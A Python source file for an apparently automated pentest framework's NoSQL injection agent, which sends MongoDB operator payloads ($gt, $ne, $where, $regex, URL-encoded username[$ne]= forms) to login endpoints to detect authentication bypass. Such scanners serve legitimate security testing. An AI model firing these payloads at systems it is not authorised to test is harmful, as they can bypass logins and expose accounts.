"""
NoSQL Injection detection agent (MongoDB-based testing)
"""

import asyncio
import json
from typing import List, Dict, Any
import httpx
from itzraven.agents.base_agent import BaseAgent, AgentResult, Finding, AgentStatus
from itzraven.core.logger import get_logger

logger = get_logger()


class NoSQLInjectionAgent(BaseAgent):
    """Agent for detecting NoSQL injection vulnerabilities"""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("NoSQL Injection Agent", target, event_bus=event_bus, memory_manager=memory_manager)

        self.nosql_payloads = [
            {
                "name": "mongodb_true",
                "payload": json.dumps({"$gt": ""}),
                "description": "MongoDB $gt always-true injection",
            },
            {
                "name": "mongodb_ne",
                "payload": json.dumps({"$ne": ""}),
                "description": "MongoDB $ne not-equal injection",
            },
            {
                "name": "mongodb_where",
                "payload": json.dumps({"$where": "1==1"}),
                "description": "MongoDB $where JavaScript injection",
            },
            {
                "name": "mongodb_regex",
                "payload": json.dumps({"$regex": ".*"}),
                "description": "MongoDB $regex wildcard injection",
            },
            {
                "name": "mongodb_in",
                "payload": json.dumps({"$in": ["admin", "true"]}),
                "description": "MongoDB $in array injection",
            },
            {
                "name": "mongodb_exists",
                "payload": json.dumps({"$exists": True}),
                "description": "MongoDB $exists injection",
            },
            {
                "name": "mongodb_gt_number",
                "payload": json.dumps({"$gt": 0}),
                "description": "MongoDB numeric $gt injection",
            },
            {
                "name": "url_encoded_true",
                "payload": "username[$gt]=&password[$gt]=",
                "description": "URL-encoded MongoDB $gt injection",
            },
            {
                "name": "url_encoded_ne",
                "payload": "username[$ne]=&password[$ne]=",
                "description": "URL-encoded MongoDB $ne injection",
            },
            {
                "name": "url_encoded_regex",
                "payload": "username[$regex]=.*&password[$regex]=.*",
                "description": "URL-encoded MongoDB $regex injection",
            },
        ]

    async def execute(self) -> AgentResult:
        logger.info(f"{self.name}: Testing {self.target}")
        await self._test_json_body_nosql()
        await self._test_url_encoded_nosql()
        await self._test_url_params_nosql()
        await self._run_nuclei_tags(tags=["nosql", "nosql-injection", "mongodb"], severity="high")

        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    async def _test_json_body_nosql(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                for p in self.nosql_payloads:
                    if p["name"].startswith("url_"):
                        continue
                    try:
                        payload_data = json.loads(p["payload"])
                        headers = {"Content-Type": "application/json"}
                        body = {"username": payload_data, "password": payload_data}
                        response = await client.post(url, json=body, headers=headers)

                        if self._detect_nosql_success(response):
                            self.add_finding(Finding(
                                title=f"NoSQL Injection [{p['name']}]",
                                description=f"NoSQL injection via JSON body. {p['description']}",
                                severity="critical",
                                category="injection",
                                evidence=f"Successful injection with {p['name']}. Status: {response.status_code}",
                                proof_of_concept=f"POST {url} with JSON body: {body}",
                                remediation="Validate and sanitize all user inputs. Use parameterized queries for NoSQL databases.",
                                confidence=0.85,
                            ))
                            break
                    except json.JSONDecodeError:
                        pass
                    except Exception as e:
                        logger.debug(f"Error testing JSON NoSQL: {e}")

    async def _test_url_encoded_nosql(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                for p in self.nosql_payloads:
                    if not p["name"].startswith("url_"):
                        continue
                    try:
                        response = await client.post(url, data=p["payload"])
                        if self._detect_nosql_success(response):
                            self.add_finding(Finding(
                                title=f"NoSQL Injection via URL-encoded [{p['name']}]",
                                description=f"NoSQL injection via URL-encoded form. {p['description']}",
                                severity="critical",
                                category="injection",
                                evidence=f"Injection with URL-encoded operators. Status: {response.status_code}",
                                proof_of_concept=f"POST {url} with data: {p['payload']}",
                                remediation="Block NoSQL operators from user input. Use strict input validation.",
                                confidence=0.85,
                            ))
                            break
                    except Exception as e:
                        logger.debug(f"Error testing URL-encoded NoSQL: {e}")

    async def _test_url_params_nosql(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                url_payloads = {
                    "username[$gt]": "",
                    "password[$gt]": "",
                }
                try:
                    response = await client.get(url, params=url_payloads)
                    if self._detect_nosql_success(response):
                        self.add_finding(Finding(
                            title="NoSQL Injection via URL Parameters",
                            description="NoSQL injection via query string using $gt operator",
                            severity="critical",
                            category="injection",
                            evidence=f"Successful injection via URL params: {url_payloads}",
                            proof_of_concept=f"GET {url}?username[$gt]=&password[$gt]=",
                            remediation="Block NoSQL operators from URL parameters",
                            confidence=0.8,
                        ))
                except Exception as e:
                    logger.debug(f"Error testing URL param NoSQL: {e}")

    def _detect_nosql_success(self, response: httpx.Response) -> bool:
        success_indicators = [
            "dashboard", "welcome", "logout", "profile",
            "logged in", "authenticated", "token",
        ]
        text_lower = response.text.lower()
        if any(indicator in text_lower for indicator in success_indicators):
            if response.status_code in [200, 302, 303]:
                return True
        if "admin" in text_lower and response.status_code == 200:
            return True
        return False
